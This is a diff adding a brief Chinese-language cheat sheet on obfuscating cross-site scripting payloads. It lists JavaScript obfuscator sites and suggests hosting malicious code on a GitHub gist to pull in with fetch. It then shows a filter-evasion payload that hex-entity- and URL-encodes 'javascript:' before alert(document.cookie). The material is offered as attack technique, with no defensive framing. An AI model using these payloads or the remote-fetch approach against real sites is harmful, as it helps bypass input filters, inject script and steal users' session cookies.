@@ -1,0 +1,7 @@
+1. https://aem1k.com/aurebesh.js
+2. http://www.liminba.com/tool/jsfuck/
+3. https://gist.github.com/ #放入恶意代码,通过fetch拉取
+4. js代码通过ascii to hex 加密, 每个hex两边添加urlencode的特殊字符
+示例:%26%23x6a%3b%26%23x61%3b%26%23x76%3b%26%23x61%3b%26%23x73%3b%26%23x63%3b%26%23x72%3b%26%23x69%3b%26%23x70%3b%26%23x74%3b%26%23x3a%3balert(document.cookie)%2f%2fmrsi736h
+%26%23%3B=urlencode(&#;)
+hex("javascript:")= 6A 61 76 61 73 63 72 69 70 74 3A 0A
